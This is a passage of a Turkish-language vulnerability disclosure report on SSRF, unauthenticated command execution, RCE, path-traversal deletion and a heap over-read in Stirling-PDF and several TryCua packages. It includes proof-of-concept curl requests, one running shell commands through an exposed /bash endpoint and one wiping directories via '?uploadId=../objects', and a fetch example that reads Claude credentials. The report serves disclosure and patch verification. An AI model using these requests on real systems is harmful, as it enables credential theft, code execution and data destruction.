  2. Ancak saldırgan `url=https://dis-site.example/sayfa.html` gönderdiğinde, sayfa içindeki `@import url("http://10.0.0.12:9090/metrics")` alt istekleri Java'dan değil doğrudan WeasyPrint Python sürecinden çıktığı için iç Kubernetes/Docker ağı engelsiz taranır.
* **Senaryo C — Kardeş Uç Noktalar (`ConvertHtmlToPDF` vs `ConvertWebsiteToPDF`) Arasındaki Yama Tutarsızlığı Nedeniyle Yanlış Güven:**
  1. Güvenlik denetçileri `v3.2.2` sürüm notlarında `CVE-2026-71270` (`GHSA-j5rg-wh78-9f2q`) açığının kapatıldığını görür ve `FileToPdf.java` içindeki `--allowed-protocols data` kısıtlamasını doğrular.
  2. Ancak `/api/v1/convert/url/pdf` uç noktası aynı WeasyPrint ikilisini `--allowed-protocols data,http,https` ile çağırmaya devam ettiği için üretim ortamı aynı SSRF vektörüne açık kalır.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. ConvertWebsiteToPDF.java ile FileToPdf.java arasındaki --allowed-protocols farkını kaynak kodda doğrulama
grep -rn -C 4 "allowed-protocols" "$HOME/audit-targets/Stirling-PDF/app/"

# 2. Yerel loopback (127.0.0.1) üzerinde izole SSRF alt-kaynak testini çalıştırma
curl -sS -X POST "http://127.0.0.1:8080/api/v1/convert/url/pdf" \
  -F "url=http://127.0.0.1:18081/public_landing.html" \
  -o /tmp/stirling_url_out.pdf
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "STIRLING-CAND-01": {
    "ghsa_id": "GHSA-ff6j-8xch-j8r6",
    "upstream_cve_duplicate_status": "Incomplete Fix / Variant of CVE-2026-71270 / GHSA-j5rg-wh78-9f2q in v3.2.2",
    "RED": {
      "weasyprint_allowed_protocols": "data,http,https",
      "internal_subresource_fetched": true,
      "internal_data_embedded_in_pdf": true,
      "internal_loopback_hit_count": 1
    },
    "GREEN": {
      "weasyprint_allowed_protocols": "data",
      "internal_subresource_fetched": false,
      "internal_data_embedded_in_pdf": false,
      "internal_loopback_hit_count": 0
    }
  }
}
```

---

### III.03 — TryCua `cuabot` (`<= 1.0.16`) — Kimlik Doğrulamasız `0.0.0.0:7842` `cuabotd` Servisi, Wildcard CORS (`*`) `POST /bash`, Origin Kontrolsüz WebSocket (`CSWSH`) ve Yazılabilir `.claude` Bağlaması Üzerinden Uzaktan Komut Çalıştırma (`GHSA-cp36-x5hg-3gg8`, `CWE-306`/`CWE-942`, CVSS `9.6 Critical`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `trycua/cua` (`npm: cuabot <= 1.0.16`)
* **Etkilenen Sürüm & Bileşenler:** `>= 1.0.1, <= 1.0.16` (`commit e754cfec69c41400eb2aabde716c27d15607b2f0`) — `libs/cuabot/src/cuabotd.ts` (satır `34-36, 259-260, 741-743, 969-1002, 1018-1063, 1120`)
* **Zafiyet Sınıfı & Skor:** `CWE-306` (Kritik Fonksiyon İçin Eksik Kimlik Doğrulaması) / `CWE-942` (Aşırı İzin Verici Çapraz Alan Adı Politikası) — **CVSS v3.1: `9.6 Critical`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H`)
* **GitHub GHSA Bağlantısı:** `GHSA-cp36-x5hg-3gg8` (`https://github.com/trycua/cua/security/advisories/GHSA-cp36-x5hg-3gg8`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md`](advisories/tr/03-CUA-CAND-01-CUABOTD-GHSA-cp36-x5hg-3gg8.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
Normalde bilgisayarınızda çalışan yerel bir servisin internetteki rastgele web siteleri tarafından kullanılmasını tarayıcıların **Aynı Köken Politikası (Same-Origin Policy / CORS)** engeller. Bir web sayfası `http://localhost:7842/bash` adresine `Content-Type: application/json` ile `POST` isteği atmak istediğinde, tarayıcı önce sunucuya bir `OPTIONS` (preflight) sorusu gönderir: *"Bu yabancı web sitesinin sana JSON komutu göndermesine ve cevabı okumasına izin veriyor musun?"*

`cuabotd.ts` içindeki kod, bu güvenlik duvarını kendi elleriyle yıkan **dört hatayı aynı anda** yapmaktadır:
1. **Kimlik doğrulaması yoktur** ve `Access-Control-Allow-Origin: *` ile `OPTIONS` isteklerine `200 OK` döner (`cuabotd.ts:969-977`).
2. `POST /bash` uç noktası gelen JSON içindeki `command` dizgisini doğrudan çalıştırıp `stdout` çıktısını yanıt olarak döner (`cuabotd.ts:996-1002`).
3. WebSocket PTY terminali (`ws://localhost:7842/?command=...`) hiçbir `Origin` kontrolü yapmadan etkileşimli kabuk açar (`cuabotd.ts:1018-1063`).
4. Sunucu başlatılırken `server.listen(port)` (`cuabotd.ts:1120`) içinde `'127.0.0.1'` belirtilmediği için `0.0.0.0:7842` (tüm Wi-Fi/LAN ağ arayüzleri) üzerinde dinler ve geliştiricinin konak `~/.cuabot/user/.claude` klasörünü yazılabilir (`-v ${claudeConfigPath}:/home/community-user/.claude`) olarak bağlar!

```typescript
// libs/cuabot/src/cuabotd.ts:967-1002 & 1120
res.setHeader('Content-Type', 'application/json');
res.setHeader('Access-Control-Allow-Origin', '*'); // HATA 1: Tüm yabancı web sitelerine tam okuma/yazma izni!
res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

if (req.method === 'OPTIONS') {
  res.writeHead(200); // HATA 2: Tarayıcı preflight kontrolünü koşulsuz onaylar!
  res.end();
  return;
}
...
if (path === 'bash' && req.method === 'POST') {
  const { command, timeout } = JSON.parse(body); // HATA 3: Hiçbir token/parola kontrolü yok!
  const result = await bash(command, timeout);
  res.end(JSON.stringify(result));
  return;
}
...
server.listen(port, () => { // HATA 4: '127.0.0.1' yok -> 0.0.0.0:7842 tüm yerel ağa açık!
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Geliştirici `cuabot` Açıkken Herhangi Bir Web Sayfasını Ziyaret Ettiğinde 0-Click Tarayıcı Üzerinden Komut Çalıştırma ve Claude Token Çalınması:**
  1. Bir yazılım geliştirici bilgisayarında `npx cuabot` komutunu başlatır; `cuabotd` arka planda `7842` portunu dinlemeye başlar.
  2. Geliştirici Chrome, Firefox veya Safari'de herhangi bir blog yazısı veya dokümantasyon sayfası açtığında, sayfanın içindeki birkaç satırlık JavaScript kodu `fetch("http://localhost:7842/bash", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({command: "cat /home/community-user/.claude/.credentials.json"}) })` çağrısı yapar.
  3. `Access-Control-Allow-Origin: *` sayesinde tarayıcı hem komutu gönderir hem de dönen JSON yanıtını yabancı web sayfasına okutur; geliştiricinin Claude OAuth/API kimlik bilgileri saniyeler içinde çalınır.
* **Senaryo B — Yazılabilir `.claude/settings.json` Kancası (`hooks`) Üzerinden Konak Makinede Kalıcı Hakimiyet:**
  1. Yabancı web sayfası aynı `POST /bash` veya `new WebSocket("ws://localhost:7842/?command=...")` çağrısıyla `/home/community-user/.claude/settings.json` dosyasına zararlı bir `PreToolUse` kabuk kancası veya sahte `mcpServers` tanımı yazar.
  2. Bu dizin konak makinedeki `~/.cuabot/user/.claude` klasörüne yazılabilir (`read-write`) bağlı olduğu için, konteyner kapatılsa bile zararlı ayar konak diskte kalıcı olur.
* **Senaryo C — Kafe, Ortak Çalışma Alanı veya Kurumsal Wi-Fi Ağında (`0.0.0.0:7842`) Doğrudan LAN Ele Geçirme:**
  1. `server.listen(port)` çağrısı `0.0.0.0:7842` adresini dinlediği için, aynı Wi-Fi veya yerel ağdaki herhangi bir cihaz tarayıcıya bile ihtiyaç duymadan doğrudan `http://<gelistirici-lan-ip>:7842/bash` ve `/screenshot` uç noktalarına bağlanır.
  2. Saldırgan canlı ekran görüntülerini (`/screenshot`) izler, fare/klavye tıklamaları gönderir ve rastgele bash komutları çalıştırır.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Yerel loopback (127.0.0.1:7842) üzerinde yabancı bir web sitesinin (Origin: https://evil.example)
#    yaptığı CORS preflight (OPTIONS) ve POST /bash çağrısını simüle etme
curl -i -sS -X OPTIONS "http://127.0.0.1:7842/bash" \
  -H "Origin: https://evil.example" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type"

curl -i -sS -X POST "http://127.0.0.1:7842/bash" \
  -H "Origin: https://evil.example" \
  -H "Content-Type: application/json" \
  -d '{"command":"id && ls -la /home/community-user/.claude"}'
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN + BENIGN`):**
```json
{
  "CUA-CAND-01": {
    "ghsa_id": "GHSA-cp36-x5hg-3gg8",
    "source_file": "cua/libs/cuabot/src/cuabotd.ts",
    "RED": {
      "http_status": 200,
      "access_control_allow_origin": "*",
      "driveby_bash_executed": true,
      "mounted_host_claude_credentials_exfiltrated": true
    },
    "GREEN": {
      "http_status": 403,
      "driveby_bash_executed": false,
      "mounted_host_claude_credentials_exfiltrated": false,
      "error": "Cross-origin browser requests forbidden"
    },
    "BENIGN": {
      "http_status": 200,
      "stdout": "authorized_cli_ok"
    }
  }
}
```

---

### III.04 — TryCua `cua-bench-rl` (`<= 0.1.0`) — `0.0.0.0:8001` `worker_server.py` Wildcard CORS, Fail-Open `OSGYM_ALLOWED_IPS` ve Kimlik Doğrulamasız `POST /reset` (`spec.loader.exec_module`) ile Uzaktan Kod Çalıştırma (`GHSA-xm8w-gj3g-4f25`, `CWE-94`/`CWE-942`, CVSS `8.8 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `trycua/cua` (`pip: cua-bench-rl <= 0.1.0` ve `cua-bench <= 0.3.1`)
* **Etkilenen Sürüm & Bileşenler:** `cua-bench-rl <= 0.1.0` (`commit e754cfec69c41400eb2aabde716c27d15607b2f0`) — `libs/cua-bench-rl/cua_bench_rl/workers/worker_server.py` (satır `79-108, 338-360, 499`) ve `libs/cua-bench/cua_bench/core.py` (`make`, satır `25-51`)
* **Zafiyet Sınıfı & Skor:** `CWE-94` (Kod Üretiminin Uygunsuz Kontrolü — Dinamik Kod Çalıştırma) / `CWE-942` (Aşırı İzin Verici CORS) — **CVSS v3.1: `8.8 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`)
* **GitHub GHSA Bağlantısı:** `GHSA-xm8w-gj3g-4f25` (`https://github.com/trycua/cua/security/advisories/GHSA-xm8w-gj3g-4f25`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/04-CUA-CAND-02-WORKER-SERVER-RCE.md`](advisories/tr/04-CUA-CAND-02-WORKER-SERVER-RCE.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
`cua-bench-rl` paketindeki `worker_server.py`, pekiştirmeli öğrenme (RL) işçi sunucusunu FastAPI üzerinde çalıştırır. Geliştirici dış erişimi kısıtlamak için `ip_filter_middleware` adında bir IP filtresi yazmış, ancak üç ölümcül tasarım hatası yapmıştır:
1. Sunucuya `CORSMiddleware(allow_origins=["*"])` eklemiştir (`satır 79-85`). Tarayıcıdan `http://127.0.0.1:8001/reset` adresine yapılan bir çapraz kökenli istekte kaynak IP `127.0.0.1` olduğu için IP filtresi isteği "yerel" sanıp içeri alır!
2. Ortam değişkeni `OSGYM_ALLOWED_IPS=""` (boş dizgi) olarak verilirse, `allowed_ips` listesi boş liste (`[]`) olur. Python'da `if allowed_ips and client_ip not in allowed_ips:` (`satır 102`) ifadesinde `bool([])` değeri `False` olduğu için **IP kontrolü tamamen atlanır (fail-open)** ve `0.0.0.0:8001` üzerindeki sunucu tüm ağa açılır!
3. Kimlik doğrulamasız `POST /reset` uç noktası (`satır 338-360`), kullanıcının JSON içinde gönderdiği `env_path` dizin yolunu doğrudan `cb.make(request.env_path)` fonksiyonuna (`cua_bench/core.py:25-51`) verir; o da o klasördeki `main.py` dosyasını `spec.loader.exec_module(module)` ile doğrudan konak Python sürecinde çalıştırır!

```python
# libs/cua-bench-rl/cua_bench_rl/workers/worker_server.py:79-105 & 338-355
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], # HATA 1: Herhangi bir web sitesinden tarayıcı isteğine izin verir!
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.middleware("http")
async def ip_filter_middleware(request: Request, call_next):
    allowed_ips = os.environ.get("OSGYM_ALLOWED_IPS", "127.0.0.1").split(",")
    allowed_ips = [ip.strip() for ip in allowed_ips if ip.strip()]
    ...
    # HATA 2: OSGYM_ALLOWED_IPS="" ise allowed_ips=[] olur ve koşul False dönerek herkese açılır!
    if allowed_ips and client_ip not in allowed_ips:
        return JSONResponse(status_code=403, content={"detail": f"Access denied for IP: {client_ip}"})
    return await call_next(request)

@app.post("/reset")
async def reset_environment(request: ResetRequest):
    # HATA 3: request.env_path doğrulanmadan cb.make() -> spec.loader.exec_module(<env_path>/main.py) çağrılır!
    env = cb.make(request.env_path, ...)
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Yapay Zeka Araştırmacısı RL İşçilerini Çalıştırırken Tarayıcı Sekmesi Üzerinden (`POST /reset` -> `exec_module`) Konak Makinede Kod Çalıştırılması:**
  1. Bir ML mühendisi yerel makinesinde `cua-bench-rl` işçisini (`127.0.0.1:8001`) başlatır ve tarayıcıdan veri kümesi/model indirir.
  2. Ziyaret edilen bir web sayfası, indirilen bir paketin veya paylaşımlı dizinin yolunu vererek `fetch("http://127.0.0.1:8001/reset", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({env_path: "/home/community-user/Downloads/untrusted_bundle"})})` isteği atar.
  3. İstek `127.0.0.1` üzerinden geldiği için `ip_filter_middleware` onay verir ve `cua_bench.core.make` anında `/home/community-user/Downloads/untrusted_bundle/main.py` dosyasını konak Python sürecinde çalıştırır.
* **Senaryo B — GPU Kümesi / Docker Compose Dağıtımında Boş `OSGYM_ALLOWED_IPS=""` Değişkeniyle Tüm Ağa Fail-Open Açılma:**
  1. Kubernetes Helm veya Docker Compose şablonlarında `OSGYM_ALLOWED_IPS: ""` boş ortam değişkeni olarak tanımlanır.
  2. `allowed_ips` listesi `[]` olarak hesaplanır ve `if allowed_ips and ...` kontrolü `False` döndüğü için kümedeki veya yerel ağdaki her düğüm `0.0.0.0:8001/reset` üzerinden doğrudan Python kodu çalıştırabilir.
* **Senaryo C — `/screenshot` ve `/step` Uç Noktaları Üzerinden Sessiz Masaüstü Gözetleme ve Tuş Enjeksiyonu:**
  1. Diske hiçbir dosya yazmadan bile, tarayıcıdaki yabancı bir sekme veya ağdaki bir eş `GET /screenshot` uç noktasını yoklayarak çalışma ortamının Base64 ekran görüntülerini canlı izler.
  2. Ardından `POST /step` uç noktasına klavye/fare eylemleri göndererek açık terminale veya masaüstü oturumuna doğrudan işletim sistemi komutları yazar.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Yerel loopback üzerinde çapraz kökenli (Origin: https://attacker.example) POST /reset çağrısını test etme
curl -i -sS -X POST "http://127.0.0.1:8001/reset" \
  -H "Origin: https://attacker.example" \
  -H "Content-Type: application/json" \
  -d '{"env_path": "/tmp/test_env_bundle", "task_index": 0}'

# 2. OSGYM_ALLOWED_IPS="" boş verildiğinde fail-open davranışını Python ile doğrulama
python3 -c '
allowed_ips = [ip.strip() for ip in "".split(",") if ip.strip()]
client_ip = "192.168.1.99"
blocked = bool(allowed_ips and client_ip not in allowed_ips)
print({"allowed_ips": allowed_ips, "remote_client_ip": client_ip, "blocked_by_filter": blocked})
'
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN + BENIGN`):**
```json
{
  "CUA-CAND-02": {
    "ghsa_id": "GHSA-xm8w-gj3g-4f25",
    "source_file": "cua/libs/cua-bench-rl/cua_bench_rl/workers/worker_server.py",
    "RED": {
      "cross_origin_reset_status": 200,
      "empty_allowed_ips_remote_lan_status": 200,
      "arbitrary_env_path_exec_module_rce": true
    },
    "GREEN": {
      "cross_origin_reset_status": 403,
      "empty_allowed_ips_remote_lan_status": 403,
      "outside_env_path_status": 400,
      "arbitrary_env_path_exec_module_rce": false
    },
    "BENIGN": {
      "loopback_valid_task_reset_status": 200
    }
  }
}
```

---

### III.05 — TryCua `cua-compat` (`<= 0.8.0`) — Daytona S3 Çok Parçalı Yükleme (`?uploadId=`) Yol Geçişi (`Path Traversal`) ve Koşulsuz `tokio::fs::remove_dir_all` ile Keyfi Dizin Silme (`GHSA-3x8g-6h2v-8qx9`, `CWE-22`, CVSS `8.1 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `trycua/cua` (`Cargo: cua-compat <= 0.8.0` ve `cua-spacesd <= 0.8.0`)
* **Etkilenen Sürüm & Bileşenler:** `<= 0.8.0` (`commit e754cfec69c41400eb2aabde716c27d15607b2f0`) — `libs/cua/crates/cua-compat/src/daytona/objectstore.rs` (`handle`, satır `320-325, 360-422`)
* **Zafiyet Sınıfı & Skor:** `CWE-22` (Yol Adının Kısıtlı Dizinle Sınırlandırılmaması — Path Traversal ile Keyfi Dizin Silme) — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H`)
* **GitHub GHSA Bağlantısı:** `GHSA-3x8g-6h2v-8qx9` (`https://github.com/trycua/cua/security/advisories/GHSA-3x8g-6h2v-8qx9`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md`](advisories/tr/05-CUA-CAND-03-DAYTONA-UPLOADID-GHSA-3x8g-6h2v-8qx9.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
CUA'nın Daytona uyumlu S3 nesne deposunda (`objectstore.rs`), geliştirici ana dosya yolunu (`key`) `..` ile üst dizine kaçmaya karşı korumak için `object_path(&key)` adında güvenli bir fonksiyon yazmış ve hatta bunun için `keys_cannot_escape_the_store` adında birim testi eklemiştir.

Ancak S3 çok parçalı yükleme (Multipart Upload) protokolündeki ikinci parametre olan URL sorgu parametresi **`?uploadId=`** tamamen unutulmuştur! Daha da kötüsü, bir yüklemeyi iptal eden `HTTP DELETE` (`AbortMultipartUpload`) işleyicisinde (`satır 415-422`) şu iki satır yer alır:
```rust
// libs/cua/crates/cua-compat/src/daytona/objectstore.rs:414-422
(Method::DELETE, Some(id), _, _) => {
    // HATA 1: remove(&id) çağrısının Some(...) dönüp dönmediği (böyle bir yüklemenin var olup olmadığı) kontrol edilmiyor!
    d.objects.uploads.lock().await.remove(&id);
    // HATA 2: id içinde "../objects" varsa doğrudan root/uploads/../objects dizinini özyinelemeli olarak siler!
    let _ = tokio::fs::remove_dir_all(d.objects.root.join("uploads").join(&id)).await;
    Response::builder()
        .status(StatusCode::NO_CONTENT)
        .body(Body::empty())
        .unwrap()
}
```
Rust'ta `PathBuf::join("../objects")` çağrısı `..` ifadelerini temizlemez; işletim sistemi `remove_dir_all(".../root/uploads/../objects")` yolunu `.../root/objects` olarak çözer. Üstelik `uploads.lock().await.remove(&id)` sonucuna bakılmadığı için saldırganın **önceden geçerli bir yükleme başlatmasına bile gerek yoktur**. Tek bir `DELETE /daytona/x?uploadId=../objects` isteğiyle sunucudaki tüm nesne deposu (`objects/`) veya `?uploadId=../../...` ile üst dizinler anında silinir!

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Tek Bir Sandbox Kiracısının Tüm Organizasyonun Sandbox İmajlarını ve Anlık Görüntülerini Silmesi (`?uploadId=../objects`):**
  1. Çoklu sandbox barındıran bir CUA Spaces / Daytona sunucusunda sıradan bir sandbox kiracısı `GET /api/object-storage/push-access` ile standart yükleme anahtarını alır.
  2. Kiracı tek bir HTTP isteği gönderir: `DELETE /daytona/dummy?uploadId=../objects`.
  3. `objectstore.rs:417` satırı `root/uploads/../objects` yolunu hedef alarak `tokio::fs::remove_dir_all` çalıştırır ve sunucudaki tüm kayıtlı sandbox imajlarını, yedekleri ve diğer kiracıların verilerini saniyeler içinde yok eder.
* **Senaryo B — `d.objects.root` Dışına Çıkarak Konak Uygulama Durumunun ve Veritabanı Dizinlerinin Silinmesi (`?uploadId=../../...`):**
  1. Saldırgan `?uploadId=../../state` veya `?uploadId=../../db` parametresiyle `DELETE` isteği gönderir.
  2. `Method::DELETE` kolu `id` değerinin bellekteki `uploads` tablosunda bulunup bulunmadığını kontrol etmediği için, `cua-spacesd` işleminin yazma izni olan herhangi bir üst konak dizini doğrudan silinir.
* **Senaryo C — `PUT` Parça Yükleme (`?partNumber=1&uploadId=../...`) ile Komşu Dizinlere Dosya Yazılması:**
  1. `Method::PUT` (`UploadPart`) işleyicisinde de (`satır 365`) `d.objects.root.join("uploads").join(&id)` kullanıldığı için, aktif bir yükleme kaydı oluşturulduğunda veya dizin yapısına göre `uploads/` dışındaki dizinlere parça dosyaları yazılabilir.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Yerel test sunucusunda (127.0.0.1) önceden hiçbir yükleme başlatmadan
#    ?uploadId=../objects ile DELETE çağrısının etkisini doğrulama
curl -i -sS -X DELETE "http://127.0.0.1:8080/daytona/anykey?uploadId=../objects" \
  -H "Authorization: AWS4-HMAC-SHA256 Credential=daytona/20261029/us-east-1/s3/aws4_request"

# 2. Cargo test ile cua-compat nesne deposu birim testlerini çalıştırma
cargo test --manifest-path "$HOME/audit-targets/cua/Cargo.toml" -p cua-compat
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN + BENIGN`):**
```json
{
  "CUA-CAND-03": {
    "ghsa_id": "GHSA-3x8g-6h2v-8qx9",
    "source_file": "cua/libs/cua/crates/cua-compat/src/daytona/objectstore.rs",
    "RED": {
      "delete_traversal_status": 204,
      "objects_store_wiped_without_prior_upload": true
    },
    "GREEN": {
      "delete_traversal_status": 400,
      "delete_uninitiated_id_status": 404,
      "objects_store_preserved": true
    },
    "BENIGN": {
      "valid_upload_abort_status": 204,
      "staging_dir_removed": true
    }
  }
}
```

---

### III.06 — TryCua `cua-media-codec` (`<= 0.8.0`) — Safe-Rust `VtEncoder::encode` (`pixel_buffer_for`) İçinde Eksik `NV12`/`BGRA` Düzlem ve Stride Sınır Doğrulaması Sonucu Yığın Bellek Aşımı (`Heap Over-Read`) ve Çökme (`GHSA-54v9-fxw3-36mm`, `CWE-125`/`CWE-190`, CVSS `5.5 Medium`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `trycua/cua` (`Cargo: cua-media-codec <= 0.8.0`)
* **Etkilenen Sürüm & Bileşenler:** `<= 0.8.0` (`commit e754cfec69c41400eb2aabde716c27d15607b2f0`) — `libs/cua/crates/cua-media-codec/src/backends/videotoolbox/mod.rs` (`VtEncoder::pixel_buffer_for` ve `VtEncoder::encode`, satır `334-420, 471-479`)
* **Zafiyet Sınıfı & Skor:** `CWE-125` (Sınır Dışı Bellek Okuma — Out-of-bounds Read) / `CWE-190` (Tamsayı Taşması / Safe-Rust Sağlamlık İhlali) — **CVSS v3.1: `5.5 Medium`** (`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:H`)
* **GitHub GHSA Bağlantısı:** `GHSA-54v9-fxw3-36mm` (`https://github.com/trycua/cua/security/advisories/GHSA-54v9-fxw3-36mm`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md`](advisories/tr/06-CUA-CAND-04-VIDEOTOOLBOX-GHSA-54v9-fxw3-36mm.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
Rust dilinin en temel güvenlik sözleşmesi şudur: **Başında `unsafe` yazmayan halka açık (`pub fn`) bir fonksiyon, kendisine hangi parametre verilirse verilsin asla bellek sınırlarını aşamaz (Undefined Behavior / Buffer Over-read yapamaz).**

`cua-media-codec` içindeki `pub fn encode(&mut self, frame: &VideoFrame<'_>)` güvenli (safe) bir Rust fonksiyonudur ve Apple Silicon donanım H.264/HEVC kodlayıcısını (VideoToolbox) çalıştırmak için `self.pixel_buffer_for(frame)` fonksiyonunu çağırır. Aynı paketteki kardeş dosya `convert.rs:98-102` içinde geliştirici `y.len() < y_stride * (h - 1) + w` sınır kontrolünü doğruca yapmıştır. Ancak `videotoolbox/mod.rs:358-420` içindeki `FrameData::Nv12` kolunda **hiçbir uzunluk veya `stride` kontrolü yapmadan** doğrudan `unsafe` bloğuna girip ham işaretçi (pointer) kopyalaması yapmıştır:
```rust
// libs/cua/crates/cua-media-codec/src/backends/videotoolbox/mod.rs:360-412
FrameData::Nv12 { y: yp, uv: uvp, y_stride: ys, uv_stride: uvs } => {
    y = yp;
    uv = uvp;
    y_stride = *ys as usize;
    uv_stride = *uvs as usize;
    // HATA: y.len(), uv.len(), y_stride < w veya uv_stride < row_bytes HİÇ KONTROL EDİLMİYOR!
}
...
unsafe {
    let base = CVPixelBufferGetBaseAddressOfPlane(pb, plane) as *mut u8;
    let dst_stride = CVPixelBufferGetBytesPerRowOfPlane(pb, plane);
    for row in 0..rows {
        // y dilimi kısa verildiğinde src.as_ptr().add(row * src_stride) doğrudan komşu heap belleğini okur!
        std::ptr::copy_nonoverlapping(
            src.as_ptr().add(row * src_stride),
            base.add(row * dst_stride),
            row_bytes,
        );
    }
}
```
Örneğin `320x4` boyutunda bir video karesi için `1280` baytlık `y` düzlemi gerekirken `320` baytlık bir dilim verildiğinde, döngü durmaz; `y` diliminin bittiği yerden sonraki **`960` baytlık komşu yığın (heap) belleğini** (süreç içindeki API anahtarları, oturum verileri vb.) doğrudan Apple VideoToolbox `CVPixelBuffer` görüntü tamponuna kopyalar ve H.264 video akışı olarak karşı tarafa gönderir veya ayrılmamış belleğe denk gelirse `SIGSEGV` ile tüm medya sunucusunu çökertir!

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — macOS Uzak Masaüstü Yayınında Pencere / Çözünürlük Değişimi Sırasında Komşu Heap Belleğinin H.264 Video Karelerine Sızması:**
  1. Canlı bir macOS uzak masaüstü veya sanal makine yayını sırasında ekran yakalayıcı, çözünürlük başlığı (`width=320, height=4`) güncellenmiş ancak alt düzlem tamponu (`y.len() = 320`) henüz yeniden boyutlandırılmamış bir `FrameData::Nv12` karesini `VtEncoder::encode` metoduna iletir.
  2. Fonksiyon `CodecError::InvalidArgument` döndürmek yerine `y` diliminin sonrasındaki `960` baytlık komşu heap belleğini `CVPixelBuffer` parlaklık (luma) düzlemine kopyalar.
  3. Süreç belleğinde o sırada bulunan oturum jetonları veya başka kiracı verileri donanımsal H.264 karesine dönüştürülerek uzak izleyiciye yayınlanır.
* **Senaryo B — Safe-Rust Çağrısıyla Medya Sunucusunun (`cua-spacesd`) `SIGSEGV` İle Çökmesi:**
  1. Alt katmandaki bir Rust bileşeni, bozuk veya boş bir `FrameData::Nv12` (`y: &[], uv: &[]`) karesini `1920x1080` başlığıyla güvenli `encode()` fonksiyonuna verir.
  2. `src.as_ptr().add(row * src_stride)` eşlenmemiş (unmapped) bellek sayfasına erişir ve tüm `cua-spacesd` / medya yayın servisi anında `SIGSEGV` ile çöker.
* **Senaryo C — Kardeş Modüller (`convert.rs` vs `videotoolbox/mod.rs`) Arasındaki Doğrulama Eksikliğinden Kaynaklanan Stride Aşımı:**
  1. Yazılımsal dönüştürücü `convert::nv12_to_bgra` (`convert.rs:98-102`) kısa tamponları reddederken, Apple Silicon donanım hızlandırması (`videotoolbox`) devreye alındığında aynı girdi kontrolsüzce `unsafe` kopyalamaya girer ve donanım kodlayıcı hattında bellek bozulmasına yol açar.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Apple Silicon donanımı üzerinde VideoToolbox sınır kontrolü testini çalıştırma
cargo test --manifest-path "$HOME/audit-targets/cua/Cargo.toml" \
  -p cua-media-codec --test videotoolbox_hw

# 2. Kısa NV12 tamponunda 960 baytlık komşu heap okumasını (RED) ve yamalı reddi (GREEN) doğrulama
python3 pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_vt01
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "CUA-VT-01": {
    "ghsa_id": "GHSA-54v9-fxw3-36mm",
    "source_file": "cua/libs/cua/crates/cua-media-codec/src/backends/videotoolbox/mod.rs",
    "geometry": {
      "width": 320,
      "height": 4,
      "y_stride": 320,
      "provided_y_len": 320,
      "required_y_len": 1280
    },
    "RED": {
      "oob_bytes_read": 960,
      "adjacent_heap_secret_copied_to_video_frame": true
    },
    "GREEN": {
      "oob_bytes_read": 0,
      "adjacent_heap_secret_copied_to_video_frame": false,
      "error_returned": "CodecError::InvalidArgument(NV12 plane buffer smaller than its geometry)"
    }
  }
}
```

---

